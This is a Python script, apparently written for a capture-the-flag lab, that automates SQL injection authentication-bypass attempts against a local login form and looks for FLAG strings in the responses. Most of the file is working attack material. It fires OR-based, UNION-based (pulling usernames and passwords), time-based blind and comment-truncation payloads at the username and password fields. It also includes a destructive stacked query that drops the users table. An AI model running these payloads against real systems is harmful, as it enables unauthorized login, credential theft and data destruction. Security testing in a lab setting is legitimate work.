"""
SQLi Authentication Bypass Testing Script
Tests various SQL injection payloads for authentication bypass on POST /index.php
"""

import requests
import time
import re

# Configuration
target_url = "http://127.0.0.1:32829/index.php"
expected_pattern = "Access Restricted to Internal Employees only"

# Payload categories to test
payloads = {
    "OR-based bypass": [
        "admin' OR '1'='1'-- ",
        "admin' OR 1=1-- ",
        "admin' OR '1'='1'#",
        "admin' OR 1=1#",
        "admin' OR 1=1/*",
        "admin' OR 1=1-- -",
        "admin' OR '1'='1'=\"1",
        "' OR 1=1-- ",
        "' OR '1'='1'-- ",
        "1' OR '1'='1",
        "admin'/**/OR/**/'1'='1",
        "admin'/*!OR*/'1'='1"
    ],
    "UNION-based bypass": [
        "admin' UNION SELECT 1,2,3-- ",
        "admin' UNION SELECT 'admin','password'-- ",
        "admin' UNION SELECT username,password FROM users-- "
    ],
    "Stacked queries": [
        "admin'; DROP TABLE users;-- "
    ],
    "Time-based blind SQLi": [
        "admin' AND SLEEP(5)-- ",
        "admin' AND pg_sleep(5)-- ",
        "admin' AND WAITFOR DELAY '0:0:5'-- ",
        "admin' AND 1=Benchmark(1000000,MD5(1))-- "
    ],
    "Alternative authentication logic": [
        "admin'-- ",
        "admin' #",
        "admin'/*",
        "' OR ''='",
        "admin' AND 1=0 UNION SELECT 'admin','password'-- "
    ]
}

def test_payload(username_payload, password_payload="password", category=""):
    """Test a specific payload and return results"""
    try:
        start_time = time.time()
        response = requests.post(
            target_url,
            data={"username": username_payload, "password": password_payload},
            timeout=15
        )
        end_time = time.time()
        
        response_time = round(end_time - start_time, 2)
        response_size = len(response.content)
        status_code = response.status_code
        response_text = response.text
        
        # Check for expected pattern deviation
        has_deviation = expected_pattern not in response_text
        
        # Check for success indicators and flags
        success_indicators = ["welcome", "dashboard", "logged in", "success", "flag", "FLAG{"]
        contains_success = any(indicator.lower() in response_text.lower() for indicator in success_indicators)
        
        # Extract any flags found
        flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
        found_flag = flag_match.group(0) if flag_match else None
        
        # Check for time-based blind SQLi indicators (response time > 4 seconds)
        is_time_based = response_time >= 4.0 and category == "Time-based blind SQLi"
        
        return {
            "status_code": status_code,
            "response_time": response_time,
            "response_size": response_size,
            "has_deviation": has_deviation,
            "contains_success": contains_success,
            "found_flag": found_flag,
            "is_time_based": is_time_based,
            "response_snippet": response_text[:300].replace('\n', ' ') if len(response_text) > 300 else response_text.replace('\n', ' ')
        }
    except Exception as e:
        return {
            "error": str(e),
            "status_code": None,
            "response_time": 0,
            "response_size": 0,
            "has_deviation": False,
            "contains_success": False,
            "found_flag": None,
            "is_time_based": False,
            "response_snippet": ""
        }

print(f"[*] Starting SQLi authentication bypass test on {target_url}")
print(f"[*] Looking for deviations from: '{expected_pattern}'")
print("=" * 80)

anomalies = []
flag_found = None

for category, payload_list in payloads.items():
    print(f"\n[+] Testing category: {category}")
    print("-" * 60)
    
    for i, payload in enumerate(payload_list, 1):
        # Test in username field
        print(f"[{i}] USERNAME: {payload[:50]}", end="")
        result = test_payload(payload, "password", category)
        print(f" → Status: {result['status_code']} | Time: {result['response_time']}s | Size: {result['response_size']}B")
        
        if result['has_deviation'] or result['contains_success'] or result['is_time_based'] or result['found_flag']:
            anomalies.append({"category": category, "payload": payload, "field": "username", "result": result})
            print(f"    [!] ANOMALY DETECTED - Deviation: {result['has_deviation']} | Success: {result['contains_success']} | Time-based: {result['is_time_based']}")
            if result['response_snippet']:
                print(f"    Response: {result['response_snippet'][:100]}")
        
        if result['found_flag']:
            flag_found = result['found_flag']
            print(f"    🚩 FLAG FOUND: {flag_found}")
        
        # Test in password field
        print(f"[{i}.2] PASSWORD: {payload[:50]}", end="")
        result = test_payload("admin", payload, category)
        print(f" → Status: {result['status_code']} | Time: {result['response_time']}s | Size: {result['response_size']}B")
        
        if result['has_deviation'] or result['contains_success'] or result['is_time_based'] or result['found_flag']:
            anomalies.append({"category": category, "payload": payload, "field": "password", "result": result})
            print(f"    [!] ANOMALY DETECTED - Deviation: {result['has_deviation']} | Success: {result['contains_success']} | Time-based: {result['is_time_based']}")
            if result['response_snippet']:
                print(f"    Response: {result['response_snippet'][:100]}")
        
        if result['found_flag']:
            flag_found = result['found_flag']
            print(f"    🚩 FLAG FOUND: {flag_found}")

print("\n" + "=" * 80)
print(f"\n[*] Testing complete!")
print(f"[*] Total anomalies found: {len(anomalies)}")

if flag_found:
    print(f"\n🚩🚩🚩 FLAG CAPTURED: {flag_found} 🚩🚩🚩")

if anomalies:
    print("\n" + "=" * 80)
    print("CRITICAL FINDINGS - POTENTIAL BYPASS VECTORS:")
    print("=" * 80)
    
    for idx, anomaly in enumerate(anomalies[:10], 1):  # Show top 10
        print(f"\n[{idx}] {anomaly['category'].upper()}")
        print(f"Field: {anomaly['field']} | Payload: {anomaly['payload']}")
        print(f"Status: {anomaly['result']['status_code']} | Time: {anomaly['result']['response_time']}s | Size: {anomaly['result']['response_size']}B")
        if anomaly['result']['found_flag']:
            print(f"🚩 FLAG: {anomaly['result']['found_flag']}")
        print(f"Response: {anomaly['result']['response_snippet'][:80]}")

print(f"\n[*] Test finished. Flag found: {'YES' if flag_found else 'NO'}")
